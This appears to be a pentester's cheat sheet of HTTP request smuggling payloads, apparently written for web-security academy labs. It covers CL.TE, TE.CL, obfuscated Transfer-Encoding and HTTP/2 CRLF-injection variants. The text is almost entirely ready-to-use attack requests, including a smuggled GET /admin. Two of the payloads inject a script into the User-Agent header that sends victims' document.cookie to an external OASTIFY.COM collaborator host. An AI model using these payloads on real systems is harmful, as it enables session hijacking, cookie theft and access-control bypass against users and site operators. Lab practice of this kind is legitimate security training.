
[CL.TE](http://cl.te):

- Content-Length: 6
    

Transfer-Encoding: chunked

\r\n

0\r\n

\r\n

X

  

[TE.CL](http://te.cl):

- Content-Length: 3
    

Transfer-Encoding: chunked

\r\n

1\r\n

X\r\n

0\r\n

\r\n  
  

  

- HTTP/2 smuggling via CRLF injection
    

Identify possible vulnerability when Target reflect previous and recent search history based on cookie, by removing cookie it is noticed that your search history is reset, confirming that it's tied to your session cookie.  
Expand the Inspector's Request Attributes section and change the protocol to HTTP/2, then append arbitrary header foo with value bar, follow with the sequence \r\n, then followed by the Transfer-Encoding: chunked, by pressing shift+ENTER.  
Note: enable the Allow HTTP/2 ALPN override option and change the body of HTTP/2 request to below POST request.

  

0

  

POST / HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Cookie: session=HACKER-SESSION-COOKIE

Content-Length: 800

  
search=test  


- [CL.TE](http://cl.te) -  
    POST / HTTP/1.1
    

Host: [example.com  
](http://example.com)Content-Type: application/x-www-form-urlencoded  
Content-Length: 47  
Transfer-Encoding: chunked  
\r\n  
3\r\n  
Abc\r\n  
0  
\r\n  
GET /admin HTTP/1.1  
  

- [TE.CL](http://te.cl) -  
    POST / HTTP/1.1  
    Host: [example.com  
    ](http://example.com)Content-Type: application/x-www-form-urlencoded  
    Content-Length: 3  
    Transfer-Encoding: chunked  
    \r\n  
    1\r\n  
    G\r\n
    0\r\n  
    \r\n



- POST / HTTP/1.1
    

Host: TARGET.net

Content-Type: application/x-www-form-urlencoded

Content-length: 4

Transfer-Encoding: chunked

Transfer-encoding: identity

  

e6

GET /post?postId=4 HTTP/1.1

User-Agent: a"/><script>document.location='http://OASTIFY.COM/?c='+document.cookie;</script>

Content-Type: application/x-www-form-urlencoded

Content-Length: 15

  

x=1

0\r\n  

\r\n


- CL.TE multiCase - User-Agent Cookie Stealer
    

POST / HTTP/1.1
Host: TARGET.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
  

0
  

GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://OASTIFY.COM/?Hack='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
  

x=1


https://github.com/gwen001/pentest-tools/blob/master/smuggler.py



POST / HTTP/1.1
Host: target-application.com
Content-Length: 62
Transfer-Encoding: chunked

4
AAAA
0

POST /smuggled-route HTTP/1.1
Host: target-application.com
X: 
